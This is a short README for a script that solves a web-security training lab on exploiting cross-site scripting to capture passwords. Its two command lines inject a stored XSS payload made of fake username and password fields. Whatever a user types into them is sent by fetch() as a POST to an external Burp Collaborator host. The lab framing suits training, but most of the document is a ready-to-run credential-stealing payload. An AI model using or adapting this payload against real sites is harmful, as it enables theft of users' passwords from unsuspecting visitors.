# How to run script.py

### Exploiting cross-site scripting to capture passwords

Open Burp Collaborator: Open Burp Suite -> Click Burp (top left button) -> Click Burp Collaborator Client -> Click Copy to clipboard -> Now Burp Collaborator Server is running and waiting for requests

Replace the [0-9a-z]{30}.burpcollaborator.net address with the copied one

No Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<input name=username id=username><input type=password name=password onchange=\"if(this.value.length)fetch('https://azdggml78f7wt74gouge0rtlwc22qr.burpcollaborator.net',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });\">"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<input name=username id=username><input type=password name=password onchange=\"if(this.value.length)fetch('https://azdggml78f7wt74gouge0rtlwc22qr.burpcollaborator.net',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });\">" -p 127.0.0.1:8080`
